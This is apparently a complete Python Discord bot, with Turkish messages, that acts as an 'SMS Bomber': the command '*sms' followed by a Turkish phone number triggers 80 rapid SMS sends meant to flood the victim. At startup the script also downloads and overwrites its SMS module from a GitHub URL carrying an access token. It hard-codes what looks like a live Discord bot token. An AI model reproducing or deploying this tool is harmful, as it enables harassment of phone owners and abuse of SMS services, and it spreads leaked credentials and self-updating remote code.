import discord
import asyncio
from time import sleep
from requests import get
r = get("https://raw.githubusercontent.com/yildirimlord/smsnoktapy/main/sms.py?token=GHSAT0AAAAAAB7IFAVTVVMZVLGIRAMODRB6ZAHTYGA").text
with open("sms.py", "r", encoding="utf-8") as f:
    read = f.read()
if read == r:
    pass
else:
    print("Güncelleme yapılıyor...")
    with open("sms.py", "w", encoding="utf-8") as f:
        f.write(r)
from sms import SendSms

TOKEN = "MTA4NDA3MjcwNzE3MzQwNDc1Mg.GUxrIc.dWEp9thpGHnRcV69WAcG5csFzP0jqldz5MwnFQ"
gif = ""
adet = 80
saniye = 0

intents = discord.Intents.all()
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print('{} Çalışmaya Başladı!'.format(client.user))
    activity = discord.Activity(type=discord.ActivityType.listening, name="dsc.gg/kdf-modding")
    await client.change_presence(activity=activity)

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if len(message.content.split(" ")) == 2 and message.content.split(" ")[0] == "*sms":
        if len(message.content.split(" ")[1]) == 10:
            telno = message.content.split(" ")[1]
            embed=discord.Embed(title="SMS Bomber (+90)", description=(f"{adet} adet SMS Gönderiliyor --> {telno}\n{message.author.mention}"), color=0x001eff,)
            embed.set_thumbnail(url=gif)
            await message.channel.send(embed=embed)
            sms = SendSms(telno, "")
            while sms.adet < adet:
                for attribute in dir(SendSms):
                    attribute_value = getattr(SendSms, attribute)
                    if callable(attribute_value):
                        if attribute.startswith('__') == False:
                            if sms.adet == adet:
                                break
                            exec("sms."+attribute+"()")
                            sleep(saniye)
            await message.channel.send(telno+" --> "+str(sms.adet)+f" adet SMS gönderildi. {message.author.mention}")                        
        else:
            await message.channel.send(f"Geçerli komut yazınız! \n\n Yardım için ' !help ' yazınız. {message.author.mention}")
    elif "!help" == message.content:
        embed=discord.Embed(title="SMS Bomber Yardım", description="Sms göndermek için komutu aşağıdaki gibi yazınız. \n *sms 5051234567(başına +90 koymayın.)", color=0x001eff,)
        await message.channel.send(embed=embed)
    else:
        pass

  
client.run(TOKEN)